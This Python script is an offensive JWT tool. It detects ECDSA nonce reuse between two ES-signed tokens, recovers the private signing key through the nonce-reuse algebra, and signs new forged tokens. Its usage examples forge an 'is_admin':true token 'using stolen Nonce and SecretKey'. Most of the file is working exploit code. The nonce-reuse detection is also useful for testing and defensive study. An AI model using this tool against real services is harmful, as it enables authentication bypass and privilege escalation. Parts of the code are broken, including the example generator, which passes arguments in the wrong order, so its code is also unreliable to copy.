#!/usr/bin/python3
"""
Date: 2026-11-12

Objective:
    
    This could 100% be written with more style and grace, but it does what I need it to. 

[*] Useful links:
    
    - https://ecdsa.com/learn/ecdsa-nonce-reuse
    - https://crypto.stackexchange.com/questions/71764/is-it-safe-to-reuse-a-ecdsa-nonce-for-two-signatures-if-the-public-keys-are-diff
    - https://www.vaadata.com/en/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/

"""
__author__ = "CodexMajor"
__version__ = "1.1.4"

import argparse
import base64
import hashlib
import json
import random
import sys

ES_SECRET_KEY = 0xa4062df2cd209c531ccd0b714e77c9f799089a240ec5d0a241afb225bea2ee12
BAD_NONCE = (0x8f69ecd30d6cd2ed042f1ce39c9cd166533343aa3bc615b6d0098ad7e9fe9f8a)

CURVE_CONFIGS = {
    "ES256": {
        "hash": hashlib.sha256,
        "byte_len": 32,
        "p": 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF,
        "a": 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC,
        "order": (
            0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
        ),
        "generator": (
            0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
            0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5,
        ),
    },
    "ES384": {
        "hash": hashlib.sha384,
        "byte_len": 48,
        "p": 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF,
        "a": 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC,
        "order": 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973,
        "generator": (
            0xAA87CA22BE8B05378EB1C71EF320AD746E1D3B628BA79B9859F741E082542A385502F25DBF55296C3A545E3872760AB7,
            0x3617DE4A96262C6F5D9E98BF9292DC29F8F41DBD289A147CE9DA3113B5F0B8C00A60B1CE1D7E819D7A431D7C90EA0E5F,
        ),
    },
    "ES512": {
        "hash": hashlib.sha512,
        "byte_len": 66,
        "p": 0x01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF,
        "a": 0x01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC,
        "order": 0x01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409,
        "generator": (
            0x00C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE3348B3C1856A429BF97E7E31C2E5BD66,
            0x011839296A789A3BC0045C8A5FB42C7D1BD998F54449579B446817AFBD17273E662C97EE72995EF42640C550B9013FAD0761353C7086A272C24088BE94769FD16650,
        ),
    },
}

def mod_inverse(number, modulus):
    return pow(number, -1, modulus)

def point_add(p1, p2, p, a):
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and y1 != y2:
        return None
    if x1 == x2:
        slope = ((3 * x1 * x1 + a) * pow(2 * y1, -1, p)) % p
    else:
        slope = ((y2 - y1) * pow(x2 - x1, -1, p)) % p
    x3 = (slope * slope - x1 - x2) % p
    y3 = (slope * (x1 - x3) - y1) % p
    return (x3, y3)

def scalar_multiply(k: int, point: tuple, p: int, a: int):
    result = None
    addend = point
    while k > 0:
        if k & 1:
            result = point_add(result, addend, p, a)
        addend = point_add(addend, addend, p, a)
        k >>= 1
    return result

def base64url_encode(data_bytes):
    return base64.urlsafe_b64encode(data_bytes).rstrip(b"=").decode("utf-8")

def base64url_decode(data: str) -> bytes:
    padding = '=' * (4 - (len(data) % 4))
    return base64.urlsafe_b64decode(data + padding)

def sign_jwt(header: dict, payload: dict, key, alg: str, nonce_int: int = None):
    #header = {"alg": alg, "typ": "JWT"}
    header = {"alg": alg}
    encoded_header = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    encoded_payload = base64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{encoded_header}.{encoded_payload}".encode("utf-8")
    if alg in CURVE_CONFIGS:
        if nonce_int is None:
            raise ValueError(f"A custom nonce_int is required for {alg}.")
        cfg = CURVE_CONFIGS[alg]
        order = cfg["order"]
        byte_len = cfg["byte_len"]
        digest = cfg["hash"](signing_input).hexdigest()
        message_hash = int(digest, 16)
        point_r = scalar_multiply(nonce_int, cfg["generator"], cfg["p"], cfg["a"])
        sig_r = point_r[0] % order
        sig_s = ((message_hash + (sig_r * key)) * pow(nonce_int, -1, order)) % order
        if sig_r == 0 or sig_s == 0:
            raise ValueError("Invalid nonce: resulted in zero signature component. Pick another nonce.")
        raw_signature = sig_r.to_bytes(byte_len, "big") + sig_s.to_bytes(byte_len, "big")
    else:
        raise ValueError(f"Unsupported algorithm: {alg}")
    
    encoded_signature = base64url_encode(raw_signature)
    return f"{encoded_header}.{encoded_payload}.{encoded_signature}"


def parse_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("[!] Invalid JWT format. Expected 'header.payload.signature'.")
    header_b64, payload_b64, sig_b64 = parts
    try:
        header = json.loads(base64url_decode(header_b64))
    except Exception as e:
        raise ValueError(f"[!] Failed to decode JWT header: {e}")
    
    alg = header.get('alg', '')
    signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
    raw_sig = base64url_decode(sig_b64)

    if alg in CURVE_CONFIGS:
        cfg = CURVE_CONFIGS[alg]
        byte_len = cfg["byte_len"]
        expected_sig_len = byte_len * 2
        if len(raw_sig) != expected_sig_len:
            raise ValueError(f"[!] Expected {expected_sig_len}-byte {alg} signature, got {len(raw_sig)} bytes.")
        msg_hash = int(cfg["hash"](signing_input).hexdigest(), 16)
        sig_r = int.from_bytes(raw_sig[:byte_len], "big")
        sig_s = int.from_bytes(raw_sig[byte_len:], "big")
        return alg, msg_hash, sig_r, sig_s
    else:
        raise ValueError(f"\n[!] Unsupported algorithm [{alg}]\n")

def recover_key_from_jwts(jwt_1: str, jwt_2: str):
    if not jwt_1 or not jwt_2:
        print("[!] Please provide two valid JWT strings into jwt-1 and jwt-2.")
        return None
    alg1, h1, sig_r1, sig_s1 = parse_jwt(jwt_1)
    alg2, h2, sig_r2, sig_s2 = parse_jwt(jwt_2)
    if alg1 != alg2:
        print(f"[!] Algorithm mismatch: jwt-1 uses {alg1}, while jwt-2 uses {alg2}.")
        return None
    if alg1 not in CURVE_CONFIGS:
        print(f"[!] Nonce reuse recovery only applies to ECDSA (ES) algorithms, got {alg1}.")
        return None
    if sig_r1 != sig_r2:
        print("[SAFE]: Sig_R values do not match. The nonce was not reused.")
        return None
    curve_order = CURVE_CONFIGS[alg1]["order"]
    sig_r = sig_r1
    h_diff = (h1 - h2) % curve_order
    sig_s_diff = (sig_s1 - sig_s2) % curve_order
    if sig_s_diff == 0:
        print("[!] Signatures are identical (same payload). Cannot recover nonce.")
        return None
    recovered_nonce = (h_diff * pow(sig_s_diff, -1, curve_order)) % curve_order
    numerator = ((sig_s1 * recovered_nonce) - h1) % curve_order
    recovered_secret_key = (numerator * pow(sig_r, -1, curve_order)) % curve_order
    print(f"\n══════ {alg1} RECOVERY RESULTS ══════")
    print(f"Shared r: {hex(sig_r)}")
    print(f"Recovered Nonce: {hex(recovered_nonce)}")
    print(f"Recovered SecretKey: {hex(recovered_secret_key)}")
    return recovered_nonce, recovered_secret_key

def detect_nonce_reuse(jwt_1: str, jwt_2: str) -> bool:
    try:
        alg1, h1, r1, s1 = parse_jwt(jwt_1)
        alg2, h2, r2, s2 = parse_jwt(jwt_2)
    except Exception as e:
        print(f"\n[!] Error parsing tokens {e}")
        return False
    if alg1 not in CURVE_CONFIGS:
        print(f"[!] Unsupported algorithm [{alg1}] for --jwt1")
        print(f"[!] Nonce reuse recovery only applies to ECDSA (ES) tokens.")
        return False
    if alg2 not in CURVE_CONFIGS:
        print(f"[!] Unsupported algorithm [{alg2}] for --jwt1")
        print(f"[!] Nonce reuse recovery only applies to ECDSA (ES) tokens.")
        return False
    print("\n═════════════ JWT1 ═════════════")
    print(f"alg: {alg1}")
    print(f"r: {hex(r1)}")
    print("═════════════ JWT2 ═════════════")
    print(f"alg: {alg2}")
    print(f"r: {hex(r2)}")
    print("=" * 32)
    if alg1 != alg2:
        print("[SAFE] Tokens use different algorithms. Nonce reuse UNLIKELY.")
        return False
    if r1 == r2:
        if s1 == s2:
            print("[!] Identical signatures (both r and s match). e.g. These two JWT payloads are the exact same.")
            return False
        else:
            print('[VULNERABLE]: ECDSA nonce REUSE DETECTED! The "r" values match while "s" values differ.')
            return True
    else:
        print('[SAFE]: The "r" values are different, indicating unique nonces.')
        return False

def validate_header(headers_string:str) -> dict:
    try:
        headers = json.loads(headers_string)
        return headers
    except Exception as e:
        print("[!] Could not validate provided headers.")
    
def validate_payload(parameter_string: str) -> dict:
    try:
        parameter_string = parameter_string.replace("True","true")
        parameter_string = parameter_string.replace("False","false")
        parameters = json.loads(parameter_string)
        print("\n═════ NEW JWT PAYLOAD DATA ═════")
        print(parameters)
        return parameters
    except Exception as e:
        print("[!] Could not validate provided headers.")

def generate_example():
    print("\n═══════════ EXAMPLE ═══════════")
    jwt_1_raw = '{"uuid":1,"username":"user01","email":"user01@example.tld","is_admin":False}'
    jwt_2_raw = '{"uuid":2,"username":"user02","email":"user02@example.tld","is_admin":False}'
    print("[+] Signing 2 new JWTs with the SAME NONCE AND SECRETKEY! BAD!?")
    print(f"[*] Nonce: {hex(BAD_NONCE)}")
    print(f"[*] SecretKey:  {hex(ES_SECRET_KEY)}")
    print("\n═════════════ JWT1 ═════════════")
    jwt_1 = sign_jwt(jwt_1_raw, ES_SECRET_KEY, "ES256", BAD_NONCE)
    print(f"[*] Payload:\n\t{jwt_1_raw}\n[*] Token:\n\t{jwt_1}")
    print("═════════════ JWT2 ═════════════")
    jwt_2 = sign_jwt(jwt_2_raw, ES_SECRET_KEY, "ES256", BAD_NONCE)
    print(f"[*] Payload:\n\t{jwt_2_raw}\n[*] Token:\n\t{jwt_2}")
    detect_nonce_reuse(jwt_1,jwt_2)
    recover_key_from_jwts(jwt_1,jwt_2)

def validate_arguments(args):
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    if args.detect:
        if not args.jwt1 or not args.jwt2:
            parser.print_help(sys.stderr)
            print("[!] Argument --detect: expected --jwt and/or --jwt2")
            exit()
    if args.sign:
        if not args.alg:
            parser.print_help(sys.stderr)
            print("[!] Argument --sign: expected --alg")
            exit()
        if not args.payload:
            parser.print_help(sys.stderr)
            print("[!] Argument --sign: expected --payload")
            exit()
        if not args.jwt1 or not args.jwt2:
            parser.print_help(sys.stderr)
            print("[!] Argument --sign: expected --jwt and/or --jwt2")
            exit()

def main(args):
    if args.gen_ex:
        generate_example()
        return
    if args.detect:
        token_is_vuln = detect_nonce_reuse(jwt_1=args.jwt1,jwt_2=args.jwt2)
        if token_is_vuln:
            recover_key_from_jwts(jwt_1=args.jwt1,jwt_2=args.jwt2)
        return
    if args.sign:
        if args.payload:
            if detect_nonce_reuse(jwt_1=args.jwt1,jwt_2=args.jwt2):
                recovered_nonce, recovered_secret_key = recover_key_from_jwts(jwt_1=args.jwt1,jwt_2=args.jwt2)
                if args.header:
                    header_data = validate_header(args.header)
                else:
                    print('[*] Using basic headers: {"alg":"'+args.alg+'","typ":"JWT"}')
                    header_data = {"alg":args.alg, "typ":"JWT"}
                payload_data = validate_payload(args.payload)
                jwt_token = sign_jwt(header_data, payload_data, recovered_secret_key, args.alg, recovered_nonce)
                print("\n═══════ S!GNED ES256 JWT ═══════")
                print(jwt_token)
                print("="*32)
        return

if __name__ == "__main__":
    funnies=["'r' you seeing double?","Randomness is hard. Basic algebra is easy.","Because who needs a CSPRNG when you have the number 4?","Two signatures, one nonce, zero private keys left.","Recycling is great for the planet, terrible for ECDSA nonces.","Same r? Don't mind if I d","RFC 6979 exists for a reason, folks.","Number used once. Emphasis on once."]
    banner = r"""
╔══════════════════════════════════════════════════════════════════════════╗
║          _   __     ______     _   __ ______  ___   _____ _   _          ║
║         | | / /     | ___ \   | | / / | ___ \/ _ \ /  ___| | | |         ║
║         | |/ /______| |_/ /   | |/ /  | |_/ / /_\ \\ `--.| |_| |         ║
║         |    \______|    /    |    \  |    /|  _  | `--. \  _  |         ║
║         | |\  \     | |\ \    | |\  \ | |\ \| | | |/\__/ / | | |         ║
║         \_| \_/     \_| \_|   \_| \_/ \_| \_\_| |_/\____/\_| |_/ v1.0    ║
╠══════════════════════════════════════════════════════════════════════════╣
║     y² = x³ + ax + b  //  r₁ = r₂  ⇒  k = (z₁ - z₂)(s₁ - s₂)⁻¹  ⇒  d     ║
║ Detects JWT nonce reuse, recovers the private key, and mints new tokens. ║
╚══════════════════════════════════════════════════════════════════════════╝

"""+"[*] "+funnies[random.randrange(0,len(funnies))]
    print(banner)

    examples = """
[*] Check out these links:
    - https://ecdsa.com/tools
    - https://ecdsa.com/learn/ecdsa-nonce-reuse
    - https://inventivehq.com/blog/what-jwt-algorithms-are-secure
    
[?] Examples:

    [?] Export the tokens to variables for ease
        export JWT1="eyJhbGciOiJFUzI1NiJ9.IntcInV1aWRcIjoxLFwidXNlcm5hbWVcIjpcInVzZXIwMVwiLFwiZW1haWxcIjpcInVzZXIwMUBleGFtcGxlLnRsZFwiLFwiaXNfYWRtaW5cIjpGYWxzZX0i.6EBK2NojGJxlffsthiRbJ8b4wgVACi4Mgy2wUlAUw08Uo6GSX_N2orMtRNDb92t9MOAsgMDfYoB25Tfc2WAQAw"
        export JWT2="eyJhbGciOiJFUzI1NiJ9.IntcInV1aWRcIjoyLFwidXNlcm5hbWVcIjpcInVzZXIwMlwiLFwiZW1haWxcIjpcInVzZXIwMkBleGFtcGxlLnRsZFwiLFwiaXNfYWRtaW5cIjpGYWxzZX0i.6EBK2NojGJxlffsthiRbJ8b4wgVACi4Mgy2wUlAUw0962i-MRztt09_FrSLW0zZX4WVz_LN5ce5XqhLoifiI5w"

    [?] Detect nonce re-use
        python3 k-rkrash.py --detect --jwt1 $JWT1 --jwt2 $JWT2

    [?] Sign a new token using stolen Nonce and SecretKey
        python3 k-rkrash.py --sign --alg "ES256" --payload '{"uuid":1,"username":"user01","email":"user01@example.tld","is_admin":true,"iat":1735689600,"exp":2735693200}' --jwt1 $JWT1 --jwt2 $JWT2

"""
    parser = argparse.ArgumentParser(epilog=examples,formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-g","--gen-ex",action="store_true",help="Generates an example pair of vulnerable ES256 JWTs using the same nonce.")
    parser.add_argument("-d","--detect",action="store_true",help="Compares `--jwt1` and `--jwt2` for 'ECDSA nonce re-use' detection.")
    parser.add_argument("-s","--sign",action="store_true",help="Signs a new token. Signs the token using the found nonce and SecretKey from a pair of vulnerable tokens.")
    parser.add_argument("-a","--alg", help="The algorithm used to encrypt new tokens.")
    parser.add_argument("-j", "--header", help="Header to be used in newly signed tokens.")
    parser.add_argument("-p","--payload", help="Payload to be used in newly signed tokens.")
    parser.add_argument("-j1","--jwt1", help="First JWT for encryption/decryption.")
    parser.add_argument("-j2","--jwt2", help="Second JWT for encryption/decryption.")
    args = parser.parse_args()
    validate_arguments(args=args)
    main(args=args)
